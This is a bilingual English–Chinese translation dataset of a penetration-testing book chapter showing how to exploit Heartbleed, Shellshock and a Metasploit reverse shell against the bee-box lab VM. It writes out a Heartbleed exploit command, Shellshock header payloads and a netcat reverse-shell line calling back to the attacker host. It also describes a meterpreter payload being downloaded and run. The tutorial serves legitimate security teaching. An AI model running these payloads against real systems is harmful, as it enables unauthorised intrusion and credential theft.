- en: Exploiting Platform Vulnerabilities
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用平台漏洞
- en: 'In this chapter, we will cover:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将涵盖：
- en: Exploiting Heartbleed vulnerability using Exploit-DB
  id: totrans-2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Exploit-DB利用Heartbleed漏洞
- en: Executing commands by exploiting Shellshock
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用Shellshock执行命令
- en: Creating and capturing a reverse shell with Metasploit
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Metasploit创建和捕获反向Shell
- en: Privilege escalation on Linux
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Linux系统中的权限提升
- en: Privilege escalation on Windows
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Windows系统中的权限提升
- en: Using Tomcat Manager to execute code
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Tomcat Manager执行代码
- en: Cracking password hashes with John the Ripper by using a dictionary
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用John the Ripper通过字典破解密码哈希
- en: Cracking password hashes via Brute Force with Hashcat
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Hashcat通过暴力破解密码哈希
- en: Introduction
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 引言
- en: From time to time, we find a server with vulnerabilities in its operating system,
    in a library the web application uses, or in an active service, or there may be
    another security issue that is not exploitable from the browser or the web proxy.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 有时我们会发现服务器存在操作系统中的漏洞、Web应用使用的库漏洞，或者活跃服务中的漏洞，或者可能还有其他无法通过浏览器或Web代理进行利用的安全问题。
- en: If the project's scope allows us to do so and no disruption is caused to the
    server, we can try and exploit such vulnerabilities and get access to the underlying
    operating system of our target application.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 如果项目范围允许，并且不会对服务器造成干扰，我们可以尝试利用这些漏洞并获得目标应用程序底层操作系统的访问权限。
- en: In this chapter, we will start from the point where we already found a vulnerability
    on the web server or operating system, then we will find an exploit for such a
    vulnerability and execute it against the target and, once the exploitation is
    successful, we will build our path up to gain administrative access, and to become
    capable of moving laterally around the network.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将从已经发现网站服务器或操作系统存在漏洞的地方开始，然后我们将寻找该漏洞的利用方式，并将其针对目标执行，一旦漏洞利用成功，我们将构建路径以获得管理员访问权限，并能够在网络中横向移动。
- en: Exploiting Heartbleed vulnerability using Exploit-DB
  id: totrans-14
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Exploit-DB利用Heartbleed漏洞
- en: Heartbleed is a vulnerability in the OpenSSL library discovered in 2014\. It
    allows the attacker to read portions of memory from the server; these portions
    may contain parts of the communication between clients and the server in clear
    text. As soon as the Heartbleed vulnerability was released, plenty of public exploits
    came to light. Offensive Security, the creators of Kali Linux, also host Exploit-DB
    ([https://www.exploit-db.com/](https://www.exploit-db.com/)[), a website that
    collects exploits made publicly available by their developers; we can find several
    variants of Heartbleed exploits there.](https://www.exploit-db.com/)
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: Heartbleed是2014年在OpenSSL库中发现的一个漏洞。它允许攻击者从服务器读取内存的部分内容；这些部分可能包含客户端与服务器之间的明文通信。一旦Heartbleed漏洞被公开，许多公共利用工具相继曝光。Kali
    Linux的创始公司Offensive Security也托管了Exploit-DB网站（[https://www.exploit-db.com/](https://www.exploit-db.com/)），这是一个收集开发者公开发布的漏洞利用工具的网站；我们可以在这里找到多种Heartbleed漏洞的利用工具。
- en: In this recipe, we will use the commands Kali includes to explore the local
    copy of Exploit-DB in Kali Linux, find the exploit we need, and finally we will
    use it to exploit Heartbleed in our target server.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 在本实例中，我们将使用Kali Linux中包含的命令，探索Kali Linux中本地的Exploit-DB副本，找到我们需要的漏洞利用工具，最终使用它来在目标服务器上利用Heartbleed漏洞。
- en: Getting ready
  id: totrans-17
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备工作
- en: For this recipe, we will use the bee-box vulnerable virtual machine ([https://sourceforge.net/projects/bwapp/files/bee-box/](https://sourceforge.net/projects/bwapp/files/bee-box/))
    as it has an OpenSSL version vulnerable to a well-known vulnerability called Heartbleed
    ([http://heartbleed.com/](http://heartbleed.com/)), which affects encrypted communication
    over protocol TLS versions 1.0 and 1.1, and allows for an attacker to extract
    a portion of the server's memory containing unencrypted information.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 本实例中，我们将使用bee-box易受攻击的虚拟机（[https://sourceforge.net/projects/bwapp/files/bee-box/](https://sourceforge.net/projects/bwapp/files/bee-box/)），因为它使用的OpenSSL版本存在一个众所周知的漏洞Heartbleed（[http://heartbleed.com/](http://heartbleed.com/)），该漏洞影响通过TLS协议版本1.0和1.1进行的加密通信，允许攻击者提取包含未加密信息的服务器内存部分。
- en: How to do it...
  id: totrans-19
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'The vulnerable bee-box virtual machine will have the IP address `192.168.56.12`
    and the vulnerable service is running on port `8443`. Let''s start by identifying
    the vulnerability in the server:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 易受攻击的bee-box虚拟机的IP地址是`192.168.56.12`，漏洞服务运行在`8443`端口。我们从识别服务器中的漏洞开始：
- en: 'We use `sslscan` to check the TCP port `8443` on bee-box; as the following
    screenshot shows, we will find it is vulnerable to Heartbleed:'
  id: totrans-21
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们使用`sslscan`来检查bee-box上的TCP端口`8443`；正如以下截图所示，我们会发现它容易受到Heartbleed的攻击：
- en: '![](assets/6409372e-353f-4c7b-bbe8-81df530fc864.png)'
  id: totrans-22
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/6409372e-353f-4c7b-bbe8-81df530fc864.png)'
- en: By exploiting Heartbleed we will extract information from the server, before
    proceeding to undertake some activities in the applications, like logging into
    bWAPP (`https://192.168.56.12:8443/bwapp/`) to be sure there's some data in the
    server's memory.
  id: totrans-23
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过利用Heartbleed漏洞，我们将从服务器中提取信息，然后继续在应用程序中进行一些操作，比如登录bWAPP（`https://192.168.56.12:8443/bwapp/`），确保服务器的内存中有一些数据。
- en: 'Now, to look for an exploit in the local copy of Exploit-DB, open a Terminal
    and type the `searchsploit heartbleed` command. The result is displayed here:'
  id: totrans-24
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，要在Exploit-DB的本地副本中查找一个漏洞，打开终端并输入`searchsploit heartbleed`命令。结果如下所示：
- en: '![](assets/63487c84-c95c-4297-b905-90f5a48a489d.png)'
  id: totrans-25
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/63487c84-c95c-4297-b905-90f5a48a489d.png)'
- en: 'We''ll pick the first exploit in the list. To inspect this exploit''s contents
    and analyze how to use it and what it does, we can simply use the `cat` command
    to display the Python code, as illustrated:'
  id: totrans-26
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们将选择列表中的第一个漏洞利用。为了检查该漏洞的内容并分析如何使用它以及它的功能，我们可以简单地使用`cat`命令来显示Python代码，如下所示：
- en: '![](assets/f9dd5f69-6f59-4e7c-934d-5a1f04ed5bf8.png)'
  id: totrans-27
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/f9dd5f69-6f59-4e7c-934d-5a1f04ed5bf8.png)'
- en: 'According to the instructions in the exploit, we should run it with the server
    address as the first parameter and then the `-p` option to indicate the port we
    want to test. So, the attacking command should be `python /usr/share/exploitdb/platforms/multiple/remote/32764.py
    192.168.56.12 -p 8443`. The next screenshot shows the result of a successful attack
    where we were able to retrieve a username and password:'
  id: totrans-28
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 根据漏洞利用中的说明，我们应该将服务器地址作为第一个参数运行它，然后使用`-p`选项来指示我们要测试的端口。因此，攻击命令应该是`python /usr/share/exploitdb/platforms/multiple/remote/32764.py
    192.168.56.12 -p 8443`。下一张截图展示了一个成功攻击的结果，我们成功地获取了一个用户名和密码：
- en: '![](assets/3742c583-96b5-4ad5-ad50-390b52ec6a31.png)'
  id: totrans-29
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/3742c583-96b5-4ad5-ad50-390b52ec6a31.png)'
- en: How it works...
  id: totrans-30
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的…
- en: Heartbleed is a buffer over-read vulnerability in the OpenSSL TLS implementation;
    this means that more data can be read from memory than should be allowed. By exploiting
    this vulnerability, an attacker can read information from the OpenSSL server memory
    in clear text, which means that we don't need to decrypt or even intercept any
    communication between the client and the server. The exploitation works by abusing
    the heartbeat messages exchanged by server and client; these are short messages
    sent by the client and answered by the server to keep the session active. In a
    vulnerable implementation, a client can claim to send a message of size X, while
    sending a smaller amount (*Y*) of bytes. The server will then respond with *X*
    bytes, taking the difference (*X*-*Y*) from the memory spaces contiguous to those
    where the received heartbeat message is stored. This memory space usually contains
    requests (already decrypted) that were previously sent by other clients.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: Heartbleed是OpenSSL TLS实现中的缓冲区过度读取漏洞；这意味着可以从内存中读取比应该允许的更多数据。通过利用这个漏洞，攻击者可以以明文形式从OpenSSL服务器的内存中读取信息，这意味着我们不需要解密或拦截客户端和服务器之间的任何通信。漏洞利用的方式是滥用服务器和客户端之间交换的心跳消息；这些是客户端发送并由服务器响应的短消息，用于保持会话活动。在一个脆弱的实现中，客户端可以声称发送一个大小为X的消息，而实际发送的是更小的字节数（*Y*）。服务器将响应*X*字节，从内存中紧邻接收心跳消息存储位置的区域获取差异（*X*
    - *Y*）。这些内存空间通常包含其他客户端之前发送的请求（已经解密）。
- en: Once we identify a vulnerable target, we use the `searchsploit` command; it
    is the interface to the local copy of Exploit-DB installed on Kali Linux, and
    it looks for a string in the exploit's title and description and displays the
    results.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们确定了一个易受攻击的目标，就可以使用`searchsploit`命令；它是Kali Linux上安装的Exploit-DB本地副本的接口，搜索漏洞标题和描述中的字符串并显示结果。
- en: Once we understand how the exploit works and determine it is safe to use, we
    run it against the target and collect the results. In our example, we were able
    to extract a valid username and password from a client connected over an encrypted
    channel.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们理解了漏洞利用的工作原理，并确认它是安全的，我们就可以将它用于目标系统并收集结果。在我们的示例中，我们成功地从通过加密通道连接的客户端提取了有效的用户名和密码。
- en: There's more...
  id: totrans-34
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多…
- en: It is very important to monitor the effect and impact of an exploit before we
    use it in a live system. Usually, exploits in Exploit-DB are trustworthy, even
    though they often need some adjustment to work in a specific situation, but there
    are some that may not do what they say; because of that, we need to check the
    source code and test it in our laboratory prior to using them in a real-life pen
    test.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 在将漏洞利用程序应用到真实系统之前，监控其效果和影响非常重要。通常，Exploit-DB中的漏洞是可靠的，尽管它们通常需要一些调整才能在特定情况下工作，但也有一些可能并没有按其声明的方式工作；因此，我们需要在实验室中检查源代码并进行测试，然后再在真实的渗透测试中使用它们。
- en: See also
  id: totrans-36
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 另见
- en: 'Besides Exploit-DB, there are other sites where we can look for known vulnerabilities
    in our target systems and exploits:'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 除了Exploit-DB，还有其他一些网站可以帮助我们查找目标系统中的已知漏洞和漏洞利用程序：
- en: '[http://www.securityfocus.com](http://www.securityfocus.com)'
  id: totrans-38
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.securityfocus.com](http://www.securityfocus.com)'
- en: '[http://www.xssed.com/](http://www.xssed.com/)'
  id: totrans-39
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.xssed.com/](http://www.xssed.com/)'
- en: '[https://packetstormsecurity.com/](https://packetstormsecurity.com/)'
  id: totrans-40
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[https://packetstormsecurity.com/](https://packetstormsecurity.com/)'
- en: '[http://seclists.org/fulldisclosure/](http://seclists.org/fulldisclosure/)'
  id: totrans-41
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://seclists.org/fulldisclosure/](http://seclists.org/fulldisclosure/)'
- en: '[http://0day.today/](http://0day.today/)'
  id: totrans-42
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://0day.today/](http://0day.today/)'
- en: Executing commands by exploiting Shellshock
  id: totrans-43
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 通过利用Shellshock执行命令
- en: Shellshock (also called Bashdoor) is a bug that was discovered in the bash shell
    in September 2014, allowing the execution of commands through functions stored
    in the values of environment variables.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: Shellshock（也称为Bashdoor）是一个在2014年9月发现的bash shell漏洞，允许通过存储在环境变量值中的函数执行命令。
- en: Shellshock is relevant to us as web penetration testers because developers sometimes
    use calls to system commands in PHP and CGI scripts—more commonly in CGI—if these
    scripts make use of system environment variables.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: Shellshock对我们这些网络渗透测试人员非常重要，因为开发人员有时会在PHP和CGI脚本中调用系统命令——尤其是在CGI脚本中——如果这些脚本使用了系统环境变量。
- en: In this recipe, we will exploit a Shellshock vulnerability in the bee-box vulnerable
    virtual machine to gain command execution on the server.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 在本教程中，我们将利用bee-box虚拟机中的Shellshock漏洞，在服务器上获得命令执行权限。
- en: How to do it...
  id: totrans-47
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'Browse to bee-box over HTTP (`http://192.168.56.12/bWAPP/`) and log in to start
    this exercise:'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 通过HTTP访问bee-box（`http://192.168.56.12/bWAPP/`）并登录，开始进行本次练习：
- en: 'In the Choose your bug: drop-down box, select Shellshock Vulnerability (CGI)
    and then click on Hack:'
  id: totrans-49
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在选择你的漏洞：下拉框中，选择Shellshock漏洞（CGI），然后点击Hack：
- en: '![](assets/08dd482f-4901-433a-ab9a-62333dbcb8f9.png)'
  id: totrans-50
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/08dd482f-4901-433a-ab9a-62333dbcb8f9.png)'
- en: 'In the text, we can see something interesting: Current user: www-data. This
    may mean that the page is using system calls to get the username. It also gives
    us a hint to attack the referrer.'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 在文本中，我们看到一个有趣的内容：当前用户：www-data。这可能意味着该页面正在使用系统调用来获取用户名。它还给了我们一个提示，可以攻击referer。
- en: 'Let''s see what is happening behind the scenes and use Burp Suite to record
    the requests and reload the page. If we look at the proxy''s history:'
  id: totrans-52
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们看看后台发生了什么，并使用Burp Suite记录请求并重新加载页面。如果我们查看代理历史记录：
- en: '![](assets/143f9b2f-ae48-4a59-bada-9fdefd731f98.png)'
  id: totrans-53
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/143f9b2f-ae48-4a59-bada-9fdefd731f98.png)'
- en: 'We can see that there is an `iframe` calling a shell script: `/cgi-bin/shellshock.sh`,
    which might be the script vulnerable to Shellshock.'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到有一个`iframe`调用了一个shell脚本：`/cgi-bin/shellshock.sh`，这可能是易受Shellshock攻击的脚本。
- en: Let's take the hint and try to attack the referrer of `shellshock.sh`. We first
    need to configure Burp Suite to intercept server responses. Go to Options in the
    Proxy tab and check the box with the text Intercept responses based on the following
    rules.
  id: totrans-55
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们根据提示，尝试攻击`shellshock.sh`的referer。我们首先需要配置Burp Suite以拦截服务器响应。在代理选项卡中，进入Options并勾选基于以下规则拦截响应的框。
- en: Now, set Burp Suite to intercept and then reload `shellshock.php`.
  id: totrans-56
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，设置Burp Suite为拦截模式，并重新加载`shellshock.php`。
- en: 'In Burp Suite, click Forward until you get to the `GET` request to `/bWAPP/cgi-bin/shellshock.sh`.
    Then, replace the `Referer` with `() { :;}; echo "Vulnerable:"` as shown in the
    following screenshot:'
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Burp Suite中，点击Forward，直到看到`GET`请求指向`/bWAPP/cgi-bin/shellshock.sh`。然后，将`Referer`替换为`()
    { :;}; echo "Vulnerable:"`，如以下截图所示：
- en: '![](assets/91b11f28-2008-4b64-a7f5-f54f29899b44.png)'
  id: totrans-58
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/91b11f28-2008-4b64-a7f5-f54f29899b44.png)'
- en: 'Click Forward again, and once more in the request to the `.ttf` file, and then
    we should get the response from `shellshock.sh`, as shown in the following screenshot:'
  id: totrans-59
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 再次点击Forward，然后再次在请求`.ttf`文件时，我们应该能够得到来自`shellshock.sh`的响应，如下图所示：
- en: '![](assets/9711560e-64a3-4b9b-a997-f6af7acda1dd.png)'
  id: totrans-60
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9711560e-64a3-4b9b-a997-f6af7acda1dd.png)'
- en: The response now has a new header parameter called `Vulnerable`. This is because
    it integrated the output of the echo command to the HTML header we submitted,
    now we can take this further and execute more interesting commands.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 响应现在有一个新的头部参数，称为`Vulnerable`。这是因为它将`echo`命令的输出集成到了我们提交的HTML头部，现在我们可以进一步执行更多有趣的命令。
- en: 'Now, try the `() { :;}; echo "Vulnerable:" $(/bin/sh -c "/sbin/ifconfig")`
    command. As the result shows, the command''s result is included in the response
    header:'
  id: totrans-62
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，尝试执行`() { :;}; echo "Vulnerable:" $(/bin/sh -c "/sbin/ifconfig")`命令。结果显示，命令的输出被包含在响应头中：
- en: '![](assets/d705a9ed-a11a-460a-94a1-b6ff5044edb7.png)'
  id: totrans-63
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d705a9ed-a11a-460a-94a1-b6ff5044edb7.png)'
- en: 'Being able to execute commands remotely on a server is a huge advantage in
    a penetration test and the next natural step is to obtain a remote shell, meaning
    a direct connection where we can send more elaborate commands. Open a Terminal
    in Kali Linux and set up a listening network port with the following command:
    `nc -vlp 12345`.'
  id: totrans-64
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在渗透测试中，能够远程执行服务器上的命令是一个巨大的优势，接下来的自然步骤是获取远程Shell，即建立一个直接连接，在此连接中我们可以发送更复杂的命令。打开Kali
    Linux中的终端，使用以下命令设置一个监听网络端口：`nc -vlp 12345`。
- en: Now go to Burp Suite proxy's history, select any request to `shellshock.sh`,
    right-click on it, and send it to the repeater.
  id: totrans-65
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，进入Burp Suite代理的历史记录，选择任何一个请求`shellshock.sh`，右键点击它，并将其发送到重复器。
- en: 'Once in the repeater, change the value of `Referer` to: `() { :;}; echo "Vulnerable:"
    $(/bin/sh -c "nc -e /bin/bash 192.168.56.10 12345")`. In this case, `192.168.56.10`
    is the address of our Kali machine.'
  id: totrans-66
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦进入重复器，更改`Referer`的值为：`() { :;}; echo "Vulnerable:" $(/bin/sh -c "nc -e /bin/bash
    192.168.56.10 12345")`。在这种情况下，`192.168.56.10`是我们Kali机器的地址。
- en: 'Click Go. If we check our Terminal, we can see the connection is established;
    issue a few commands to check whether or not we have a remote shell:'
  id: totrans-67
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击“Go”。如果我们查看终端，可以看到连接已建立；发出一些命令以检查是否已经获得远程Shell：
- en: '![](assets/3e76e705-154e-4b70-94e2-d3e88ef8246e.png)'
  id: totrans-68
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/3e76e705-154e-4b70-94e2-d3e88ef8246e.png)'
- en: How it works...
  id: totrans-69
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: In the first five steps, we discovered that there was a call to a shell script
    and, as it should have been run by a shell interpreter, it may have been bash
    or a vulnerable version of bash.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 在前五个步骤中，我们发现存在对Shell脚本的调用，由于该脚本应该由Shell解释器运行，它可能是bash或一个存在漏洞的bash版本。
- en: 'To verify that, we performed the following test:'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 为了验证这一点，我们执行了以下测试：
- en: '[PRE0]'
  id: totrans-72
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: The first part, `() { :;};`, is an empty function definition since bash can
    store functions as environment variables, and this is the core of the vulnerability,
    as the parser keeps interpreting (and executing) the commands after the function
    ends. This allows us to issue the second part, `echo "Vulnerable:"`, a command
    that simply returns and echoes what it is given as input.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 第一部分`() { :;};`是一个空的函数定义，因为bash可以将函数存储为环境变量，而这是漏洞的核心，因为解析器会在函数结束后继续解析（并执行）命令。这使我们能够发出第二部分`echo
    "Vulnerable:"`，该命令简单地返回并回显它收到的输入。
- en: The vulnerability occurs in the web server because the CGI implementation maps
    all the parts of a request to environment variables, so this attack also works
    if done over User-Agent or Accept-Language instead of referer. Once we know the
    server is vulnerable, we issue a test command, `ifconfig`, and set up a reverse
    shell.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 漏洞发生在Web服务器中，因为CGI实现将请求的所有部分映射到环境变量，因此即使通过User-Agent或Accept-Language而不是Referer进行攻击，这个漏洞也同样有效。一旦我们确认服务器存在漏洞，就可以发出测试命令`ifconfig`，并设置一个反向Shell。
- en: A reverse shell is a remote shell that has the particular characteristic of
    being initiated by the server so that the client listens for a connection instead
    of the server waiting for a client to connect, as in a bind connection.
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 反向Shell是一种具有特定特点的远程Shell，它由服务器发起，使得客户端监听连接，而不是服务器等待客户端连接，像绑定连接那样。
- en: Once we have a shell to the server, we need to escalate privileges and get the
    information needed to help with our penetration test.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们获得了服务器的Shell，我们需要提升权限并获取渗透测试所需的信息。
- en: There's more...
  id: totrans-77
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多...
- en: Shellshock affects a huge number of servers and devices all around the world,
    and there is a variety of ways to exploit it. For example, the Metasploit Framework
    includes a module to set up a DHCP server to inject commands on the clients that
    connect to it; this is very useful in a network penetration test in which we have
    mobile devices connected to the LAN ([https://www.rapid7.com/db/modules/auxiliary/server/dhclient_bash_env](https://www.rapid7.com/db/modules/auxiliary/server/dhclient_bash_env)).
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: Shellshock 漏洞影响了全球大量的服务器和设备，且有多种利用方式。例如，Metasploit 框架中包含一个模块，用于设置 DHCP 服务器，将命令注入到连接到它的客户端；这在进行网络渗透测试时非常有用，尤其是当我们有移动设备连接到局域网时（[https://www.rapid7.com/db/modules/auxiliary/server/dhclient_bash_env](https://www.rapid7.com/db/modules/auxiliary/server/dhclient_bash_env)）。
- en: Creating and capturing a reverse shell with Metasploit
  id: totrans-79
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用 Metasploit 创建并捕获反向 Shell
- en: When we gain command execution on a server, we usually get it through a limited
    web-shell. The next thing we need to do is to find a way to upgrade this limited
    shell into a fully interactive shell and eventually escalate it to root/administrator
    level privileges.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们在服务器上获得命令执行权限时，通常是通过一个受限的 Web Shell。接下来，我们需要做的是找到一种方法，将这个受限的 Shell 升级为完全交互式的
    Shell，并最终提升为 root/管理员权限。
- en: In this recipe, we will learn how to use Metasploit's `msfvenom` to create an
    executable program that triggers a connection back to our attacking machine and
    spawns an advanced shell (meterpreter) so we can further exploit the server.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个教程中，我们将学习如何使用 Metasploit 的 `msfvenom` 创建一个可执行程序，触发与我们的攻击机连接并生成一个高级 Shell（meterpreter），以便我们进一步利用服务器。
- en: How to do it...
  id: totrans-82
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何做到这一点...
- en: 'For this exercise, have both the Kali and bee-box virtual machines running,
    then follow the next steps:'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这个练习，请确保 Kali 和 bee-box 虚拟机都在运行，然后按照以下步骤操作：
- en: 'First, we use `msfvenom` to generate our reverse meterpreter shell, setting
    it up to connect back to the Kali machine''s IP address. Open a Terminal in Kali
    and issue the following command:'
  id: totrans-84
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，我们使用 `msfvenom` 生成我们的反向 meterpreter Shell，并将其设置为连接回 Kali 主机的 IP 地址。打开 Kali
    中的终端并输入以下命令：
- en: '[PRE1]'
  id: totrans-85
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: '![](assets/9a25e509-0f89-4175-abed-618b4b9e441d.png)'
  id: totrans-86
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9a25e509-0f89-4175-abed-618b4b9e441d.png)'
- en: This will create a file named `cute_dolphin.bin`, which is a reverse Linux meterpreter
    shell; reverse means that it will connect back to the attacking machine instead
    of listening for us to connect.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 这将创建一个名为 `cute_dolphin.bin` 的文件，这是一个反向 Linux meterpreter Shell；反向意味着它将连接回攻击机器，而不是等待我们连接。
- en: 'Next, we need to set up a listener for the connection our cute dolphin is going
    to create. Open a `msfconsole` terminal and once it loads, issue the following
    commands:'
  id: totrans-88
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们需要为即将由我们可爱的海豚创建的连接设置一个监听器。打开一个 `msfconsole` 终端，加载完成后，输入以下命令：
- en: '[PRE2]'
  id: totrans-89
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'As you can see, the payload, `lhost`, and `lport` are the ones we used to create
    the `.bin` file. This is the IP address and TCP port the program is going to connect
    to, so we will need to listen on that network interface of our Kali Linux and
    over that port. The final exploit configuration should look as follows:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，载荷、`lhost` 和 `lport` 是我们用来创建 `.bin` 文件的。这是程序将要连接的 IP 地址和 TCP 端口，因此我们需要在
    Kali Linux 的网络接口上监听该端口。最终的漏洞配置应该如下所示：
- en: '![](assets/b8db6eac-beb7-4dc2-b40d-4fa4556361be.png)'
  id: totrans-91
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b8db6eac-beb7-4dc2-b40d-4fa4556361be.png)'
- en: 'Now we have our Kali ready, it''s time to prepare the attack on the victim.
    Let''s start the Apache service as the root and run the following code:'
  id: totrans-92
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们的 Kali 准备好了，是时候准备攻击目标了。以 root 用户启动 Apache 服务并运行以下代码：
- en: '[PRE3]'
  id: totrans-93
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'Then, copy the malicious file to the web server folder:'
  id: totrans-94
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 然后，将恶意文件复制到 Web 服务器文件夹：
- en: '[PRE4]'
  id: totrans-95
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'Now we proceed to the exploitation. We know bee-box is vulnerable to Shellshock
    and will use it to make the server download the malicious file. Exploit Shellshock
    on the server with the following payload:'
  id: totrans-96
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们开始进行攻击。我们知道 bee-box 存在 Shellshock 漏洞，将利用它让服务器下载恶意文件。使用以下有效载荷在服务器上利用 Shellshock
    漏洞：
- en: '[PRE5]'
  id: totrans-97
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'The last two parts of the payload are for setting the execution permission
    to the downloaded file (`chmod +x /tmp/cute_dolphin.bin`) and to make sure the
    file was downloaded (`ls -l /tmp/cute_dolphin.bin`). As the following screenshot
    shows, a successful exploitation will return the filename and its properties:'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 载荷的最后两部分用于设置下载文件的执行权限（`chmod +x /tmp/cute_dolphin.bin`）以及确认文件已下载（`ls -l /tmp/cute_dolphin.bin`）。如以下截图所示，成功利用漏洞将返回文件名及其属性：
- en: '![](assets/5b54ca2c-b228-4ada-9ccf-0c922020a878.png)'
  id: totrans-99
  prefs: []
  type: TYPE_IMG
